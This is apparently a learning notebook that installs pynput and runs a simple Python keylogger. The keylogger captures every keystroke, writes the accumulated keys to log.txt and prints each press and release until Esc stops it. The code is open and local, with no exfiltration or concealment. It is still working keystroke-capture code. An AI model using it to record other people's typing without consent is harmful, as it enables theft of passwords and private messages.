{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0fffb95a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in e:\\anaconda\\lib\\site-packages (1.7.6)\n",
      "Requirement already satisfied: six in e:\\anaconda\\lib\\site-packages (from pynput) (1.15.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "56061b9c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "alphanumeric key s pressed\n",
      "'s' released\n",
      "alphanumeric key d pressed\n",
      "'d' released\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "alphanumeric key g pressed\n",
      "'g' released\n",
      "special key Key.backspace pressed\n",
      "Key.backspace released\n",
      "special key Key.shift_r pressed\n",
      "Key.shift_r released\n"
     ]
    }
   ],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "  \n",
    "keys = []\n",
    "  \n",
    "def on_press(key):\n",
    "     \n",
    "    keys.append(key)\n",
    "    write_file(keys)\n",
    "     \n",
    "    try:\n",
    "        print('alphanumeric key {0} pressed'.format(key.char))\n",
    "         \n",
    "    except AttributeError:\n",
    "        print('special key {0} pressed'.format(key))\n",
    "          \n",
    "def write_file(keys):\n",
    "     \n",
    "    with open('log.txt', 'w') as f:\n",
    "        for key in keys:\n",
    "             \n",
    "            # removing ''\n",
    "            k = str(key).replace(\"'\", \"\")\n",
    "            f.write(k)\n",
    "                     \n",
    "            # explicitly adding a space after\n",
    "            # every keystroke for readability\n",
    "            f.write(' ')\n",
    "              \n",
    "def on_release(key):\n",
    "                     \n",
    "    print('{0} released'.format(key))\n",
    "    if key == Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "  \n",
    "  \n",
    "with Listener(on_press = on_press,\n",
    "              on_release = on_release) as listener:\n",
    "                     \n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f791260c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
